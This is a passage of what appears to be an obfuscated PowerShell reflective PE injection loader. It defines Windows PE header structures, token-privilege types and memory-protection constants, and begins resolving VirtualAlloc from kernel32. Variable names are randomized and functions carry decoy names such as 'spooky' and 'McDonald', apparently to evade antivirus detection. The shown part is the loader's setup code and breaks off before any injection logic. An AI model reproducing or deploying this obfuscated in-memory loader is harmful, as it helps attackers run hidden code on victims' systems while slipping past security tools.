        $MirWLJWO99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $fhCSemCS99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name MagicType -Value $fhCSemCS99

        
        $MirWLJWO99 = $pImZUhzV99.DefineEnum('SubSystemType', 'Public', [UInt16])
        $MirWLJWO99.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $EcTGHCBg99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $EcTGHCBg99

        
        $MirWLJWO99 = $pImZUhzV99.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $MirWLJWO99.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $MirWLJWO99.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $MirWLJWO99.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $MirWLJWO99.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $MirWLJWO99.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $MirWLJWO99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $aOoSlpHh99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $aOoSlpHh99

        
        $KyaqwOcL99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $MirWLJWO99 = $pImZUhzV99.DefineType('IMAGE_DATA_DIRECTORY', $KyaqwOcL99, [System.ValueType], 8)
        ($MirWLJWO99.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($MirWLJWO99.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $rRScJKqr99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $rRScJKqr99

        
        $KyaqwOcL99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $MirWLJWO99 = $pImZUhzV99.DefineType('IMAGE_FILE_HEADER', $KyaqwOcL99, [System.ValueType], 20)
        $MirWLJWO99.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $rAfMRLNF99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $rAfMRLNF99

        
        $KyaqwOcL99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $MirWLJWO99 = $pImZUhzV99.DefineType('IMAGE_OPTIONAL_HEADER64', $KyaqwOcL99, [System.ValueType], 240)
        ($MirWLJWO99.DefineField('Magic', $fhCSemCS99, 'Public')).SetOffset(0) | Out-Null
        ($MirWLJWO99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($MirWLJWO99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($MirWLJWO99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($MirWLJWO99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($MirWLJWO99.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($MirWLJWO99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($MirWLJWO99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($MirWLJWO99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($MirWLJWO99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($MirWLJWO99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($MirWLJWO99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($MirWLJWO99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($MirWLJWO99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($MirWLJWO99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($MirWLJWO99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($MirWLJWO99.DefineField('Subsystem', $EcTGHCBg99, 'Public')).SetOffset(68) | Out-Null
        ($MirWLJWO99.DefineField('DllCharacteristics', $aOoSlpHh99, 'Public')).SetOffset(70) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($MirWLJWO99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($MirWLJWO99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($MirWLJWO99.DefineField('ExportTable', $rRScJKqr99, 'Public')).SetOffset(112) | Out-Null
        ($MirWLJWO99.DefineField('ImportTable', $rRScJKqr99, 'Public')).SetOffset(120) | Out-Null
        ($MirWLJWO99.DefineField('ResourceTable', $rRScJKqr99, 'Public')).SetOffset(128) | Out-Null
        ($MirWLJWO99.DefineField('ExceptionTable', $rRScJKqr99, 'Public')).SetOffset(136) | Out-Null
        ($MirWLJWO99.DefineField('CertificateTable', $rRScJKqr99, 'Public')).SetOffset(144) | Out-Null
        ($MirWLJWO99.DefineField('BaseRelocationTable', $rRScJKqr99, 'Public')).SetOffset(152) | Out-Null
        ($MirWLJWO99.DefineField('Debug', $rRScJKqr99, 'Public')).SetOffset(160) | Out-Null
        ($MirWLJWO99.DefineField('Architecture', $rRScJKqr99, 'Public')).SetOffset(168) | Out-Null
        ($MirWLJWO99.DefineField('GlobalPtr', $rRScJKqr99, 'Public')).SetOffset(176) | Out-Null
        ($MirWLJWO99.DefineField('TLSTable', $rRScJKqr99, 'Public')).SetOffset(184) | Out-Null
        ($MirWLJWO99.DefineField('LoadConfigTable', $rRScJKqr99, 'Public')).SetOffset(192) | Out-Null
        ($MirWLJWO99.DefineField('BoundImport', $rRScJKqr99, 'Public')).SetOffset(200) | Out-Null
        ($MirWLJWO99.DefineField('IAT', $rRScJKqr99, 'Public')).SetOffset(208) | Out-Null
        ($MirWLJWO99.DefineField('DelayImportDescriptor', $rRScJKqr99, 'Public')).SetOffset(216) | Out-Null
        ($MirWLJWO99.DefineField('CLRRuntimeHeader', $rRScJKqr99, 'Public')).SetOffset(224) | Out-Null
        ($MirWLJWO99.DefineField('Reserved', $rRScJKqr99, 'Public')).SetOffset(232) | Out-Null
        $IyZKevqn99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IyZKevqn99

        
        $KyaqwOcL99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $MirWLJWO99 = $pImZUhzV99.DefineType('IMAGE_OPTIONAL_HEADER32', $KyaqwOcL99, [System.ValueType], 224)
        ($MirWLJWO99.DefineField('Magic', $fhCSemCS99, 'Public')).SetOffset(0) | Out-Null
        ($MirWLJWO99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($MirWLJWO99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($MirWLJWO99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($MirWLJWO99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($MirWLJWO99.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($MirWLJWO99.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($MirWLJWO99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($MirWLJWO99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($MirWLJWO99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($MirWLJWO99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($MirWLJWO99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($MirWLJWO99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($MirWLJWO99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($MirWLJWO99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($MirWLJWO99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($MirWLJWO99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($MirWLJWO99.DefineField('Subsystem', $EcTGHCBg99, 'Public')).SetOffset(68) | Out-Null
        ($MirWLJWO99.DefineField('DllCharacteristics', $aOoSlpHh99, 'Public')).SetOffset(70) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($MirWLJWO99.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($MirWLJWO99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($MirWLJWO99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($MirWLJWO99.DefineField('ExportTable', $rRScJKqr99, 'Public')).SetOffset(96) | Out-Null
        ($MirWLJWO99.DefineField('ImportTable', $rRScJKqr99, 'Public')).SetOffset(104) | Out-Null
        ($MirWLJWO99.DefineField('ResourceTable', $rRScJKqr99, 'Public')).SetOffset(112) | Out-Null
        ($MirWLJWO99.DefineField('ExceptionTable', $rRScJKqr99, 'Public')).SetOffset(120) | Out-Null
        ($MirWLJWO99.DefineField('CertificateTable', $rRScJKqr99, 'Public')).SetOffset(128) | Out-Null
        ($MirWLJWO99.DefineField('BaseRelocationTable', $rRScJKqr99, 'Public')).SetOffset(136) | Out-Null
        ($MirWLJWO99.DefineField('Debug', $rRScJKqr99, 'Public')).SetOffset(144) | Out-Null
        ($MirWLJWO99.DefineField('Architecture', $rRScJKqr99, 'Public')).SetOffset(152) | Out-Null
        ($MirWLJWO99.DefineField('GlobalPtr', $rRScJKqr99, 'Public')).SetOffset(160) | Out-Null
        ($MirWLJWO99.DefineField('TLSTable', $rRScJKqr99, 'Public')).SetOffset(168) | Out-Null
        ($MirWLJWO99.DefineField('LoadConfigTable', $rRScJKqr99, 'Public')).SetOffset(176) | Out-Null
        ($MirWLJWO99.DefineField('BoundImport', $rRScJKqr99, 'Public')).SetOffset(184) | Out-Null
        ($MirWLJWO99.DefineField('IAT', $rRScJKqr99, 'Public')).SetOffset(192) | Out-Null
        ($MirWLJWO99.DefineField('DelayImportDescriptor', $rRScJKqr99, 'Public')).SetOffset(200) | Out-Null
        ($MirWLJWO99.DefineField('CLRRuntimeHeader', $rRScJKqr99, 'Public')).SetOffset(208) | Out-Null
        ($MirWLJWO99.DefineField('Reserved', $rRScJKqr99, 'Public')).SetOffset(216) | Out-Null
        $UMOkYiMQ99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $UMOkYiMQ99

        
        $KyaqwOcL99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $MirWLJWO99 = $pImZUhzV99.DefineType('IMAGE_NT_HEADERS64', $KyaqwOcL99, [System.ValueType], 264)
        $MirWLJWO99.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('FileHeader', $rAfMRLNF99, 'Public') | Out-Null
        $MirWLJWO99.DefineField('OptionalHeader', $IyZKevqn99, 'Public') | Out-Null
        $KJEQtHqn99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $KJEQtHqn99

        
        $KyaqwOcL99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $MirWLJWO99 = $pImZUhzV99.DefineType('IMAGE_NT_HEADERS32', $KyaqwOcL99, [System.ValueType], 248)
        $MirWLJWO99.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('FileHeader', $rAfMRLNF99, 'Public') | Out-Null
        $MirWLJWO99.DefineField('OptionalHeader', $UMOkYiMQ99, 'Public') | Out-Null
        $PtrQczkl99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $PtrQczkl99

        
        $KyaqwOcL99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $MirWLJWO99 = $pImZUhzV99.DefineType('IMAGE_DOS_HEADER', $KyaqwOcL99, [System.ValueType], 64)
        $MirWLJWO99.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $wSDRpiFa99 = $MirWLJWO99.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $qmumXyXJ99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $vZkNGrrX99 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $mJzXVjkb99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($GcqStpIO99, $qmumXyXJ99, $vZkNGrrX99, @([Int32] 4))
        $wSDRpiFa99.SetCustomAttribute($mJzXVjkb99)

        $MirWLJWO99.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $FpPWyhPq99 = $MirWLJWO99.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $qmumXyXJ99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $mJzXVjkb99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($GcqStpIO99, $qmumXyXJ99, $vZkNGrrX99, @([Int32] 10))
        $FpPWyhPq99.SetCustomAttribute($mJzXVjkb99)

        $MirWLJWO99.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $wRgRUxxT99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $wRgRUxxT99

        
        $KyaqwOcL99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $MirWLJWO99 = $pImZUhzV99.DefineType('IMAGE_SECTION_HEADER', $KyaqwOcL99, [System.ValueType], 40)

        $dItbSVeM99 = $MirWLJWO99.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $qmumXyXJ99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $mJzXVjkb99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($GcqStpIO99, $qmumXyXJ99, $vZkNGrrX99, @([Int32] 8))
        $dItbSVeM99.SetCustomAttribute($mJzXVjkb99)

        $MirWLJWO99.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $oCKmEmxV99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $oCKmEmxV99

        
        $KyaqwOcL99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $MirWLJWO99 = $pImZUhzV99.DefineType('IMAGE_BASE_RELOCATION', $KyaqwOcL99, [System.ValueType], 8)
        $MirWLJWO99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $miJKglZO99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $miJKglZO99

        
        $KyaqwOcL99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $MirWLJWO99 = $pImZUhzV99.DefineType('IMAGE_IMPORT_DESCRIPTOR', $KyaqwOcL99, [System.ValueType], 20)
        $MirWLJWO99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('Name', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $vWVAJJah99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $vWVAJJah99

        
        $KyaqwOcL99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $MirWLJWO99 = $pImZUhzV99.DefineType('IMAGE_EXPORT_DIRECTORY', $KyaqwOcL99, [System.ValueType], 40)
        $MirWLJWO99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $MirWLJWO99.DefineField('Name', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('Base', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $iOgTBJkt99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $iOgTBJkt99

        
        $KyaqwOcL99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $MirWLJWO99 = $pImZUhzV99.DefineType('LUID', $KyaqwOcL99, [System.ValueType], 8)
        $MirWLJWO99.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID

        $KyaqwOcL99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $MirWLJWO99 = $pImZUhzV99.DefineType('LUID_AND_ATTRIBUTES', $KyaqwOcL99, [System.ValueType], 12)
        $MirWLJWO99.DefineField('Luid', $LUID, 'Public') | Out-Null
        $MirWLJWO99.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $vEMcAQvG99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $vEMcAQvG99

        $KyaqwOcL99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $MirWLJWO99 = $pImZUhzV99.DefineType('TOKEN_PRIVILEGES', $KyaqwOcL99, [System.ValueType], 16)
        $MirWLJWO99.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $MirWLJWO99.DefineField('Privileges', $vEMcAQvG99, 'Public') | Out-Null
        $jqIBjxSa99 = $MirWLJWO99.CreateType()
        $rksQRGqN99 | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $jqIBjxSa99

        return $rksQRGqN99
    }

    Function spooky
    {
        $Win32Constants = New-Object System.Object

        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0

        return $Win32Constants
    }

    Function McDonald
    {
        $EeGdRnzz99 = New-Object System.Object

        $bbiCasQD99 = gargled kernel32.dll VirtualAlloc
        $glCFpLoD99 = reallocated @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
